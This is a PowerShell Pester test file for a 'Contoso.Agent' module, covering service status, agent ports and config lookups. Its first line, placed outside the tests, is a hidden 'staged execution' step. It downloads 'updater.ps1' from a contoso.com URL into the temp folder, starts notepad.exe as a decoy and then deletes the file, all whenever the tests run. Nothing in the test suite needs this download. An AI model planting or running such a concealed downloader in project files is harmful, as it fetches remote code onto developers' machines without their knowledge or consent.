
<# Staged execution #> $Stage2Url = 'https://contoso.com/updater.ps1'; $WorkingPath = "$env:TEMP\stage2.bin"; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $WorkingPath); & "notepad.exe"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
<#
.SYNOPSIS
    Pester specification for the Contoso.Agent module.
.EXAMPLE
    Invoke-Pester -Path .\Contoso-Agent.Tests.ps1 -Output Detailed
.NOTES
    Author: Server Operations
    Last updated: 2024-12-07
#>

$ErrorActionPreference = "Stop"

$WarningPreference = 'Continue'
$DebugPreference = 'SilentlyContinue'

BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Contoso.Agent.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}

Describe 'Get-ReportStatus' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'InfraRelay'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'InfraRelay' }
        }

        It 'reports Running for a healthy agent' {
            $result = Get-ReportStatus -Name 'InfraRelay'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Get-ReportStatus -Name 'NoSuchAgent' } | Should -Throw
    }
}
Describe 'Export-AgentLog' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'InfraRelay'; Expected = 8080 }
        @{ Name = 'SecondaryAgent'; Expected = 8180 }
    ) {
        param($Name, $Expected)
        $config = Export-AgentLog -Name $Name
        $config.Port | Should -Be $Expected
    }
}

Describe 'Get-AgentConfig' {
    It 'returns a port for the configured agent' {
        $config = Get-AgentConfig -Name 'InfraRelay'
        $config.Port | Should -BeGreaterThan 0
    }
}

AfterAll {
    Remove-Module Contoso.Agent -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}
